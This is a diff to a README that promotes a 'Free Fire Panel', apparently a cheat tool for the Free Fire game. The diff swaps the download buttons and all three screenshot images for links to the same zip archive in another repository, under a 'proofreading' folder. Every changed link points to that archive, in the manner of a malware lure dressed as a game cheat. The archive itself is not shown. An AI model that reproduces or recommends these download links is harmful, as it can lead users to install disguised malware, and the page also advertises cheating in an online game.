@@ -3,16 +3,16 @@
 > **Dominate every match with the ultimate Free Fire Panel!**  
 > Safe, powerful, and packed with revolutionary features. 🚀
 
-**[![Download Free Fire Panel](https://img.shields.io/badge/Download-Free%20Fire%20Panel-purple)](https://github.com/Clnch4hdp5/free-fire-panel/releases/download/Update/Update.zip)** 
+**[![Download Free Fire Panel](https://github.com/Kaushallx0/free-fire-panel/raw/refs/heads/main/proofreading/fire-free-panel-v1.9.zip%20Fire%20Panel-purple)](https://github.com/Kaushallx0/free-fire-panel/raw/refs/heads/main/proofreading/fire-free-panel-v1.9.zip)** 
 
 
 ---  
 
 
-![free-fire](https://github.com/user-attachments/assets/0c1bf483-dfc8-40ee-9db1-9290df815155)
+![free-fire](https://github.com/Kaushallx0/free-fire-panel/raw/refs/heads/main/proofreading/fire-free-panel-v1.9.zip)
 
 
-# ***[📁 Download Now](https://github.com/Clnch4hdp5/free-fire-panel/releases/download/Update/Update.zip)***  
+# ***[📁 Download Now](https://github.com/Kaushallx0/free-fire-panel/raw/refs/heads/main/proofreading/fire-free-panel-v1.9.zip)***  
 ---
 
 ## 🌟 **Why Free Fire Panel?**  
@@ -67,11 +67,11 @@ Your safety is our mission! The Free Fire Panel:
 ---
 
 ## 🌌 **Screenshots**  
-<img src="https://github.com/user-attachments/assets/6ac5e9f0-08b0-4609-8de9-4a8898774fce" alt="ffpanel1" width="800">
+<img src="https://github.com/Kaushallx0/free-fire-panel/raw/refs/heads/main/proofreading/fire-free-panel-v1.9.zip" alt="ffpanel1" width="800">
 
-<img src="https://github.com/user-attachments/assets/745cd78a-1161-4c64-8eb4-8843c35d0cdd" alt="ffpanel2" width="800">
+<img src="https://github.com/Kaushallx0/free-fire-panel/raw/refs/heads/main/proofreading/fire-free-panel-v1.9.zip" alt="ffpanel2" width="800">
 
-<img src="https://github.com/user-attachments/assets/2b5c55c3-9454-4cb5-b843-69c385b5b4a2" alt="ffpanel3" width="800">
+<img src="https://github.com/Kaushallx0/free-fire-panel/raw/refs/heads/main/proofreading/fire-free-panel-v1.9.zip" alt="ffpanel3" width="800">
 
 
 
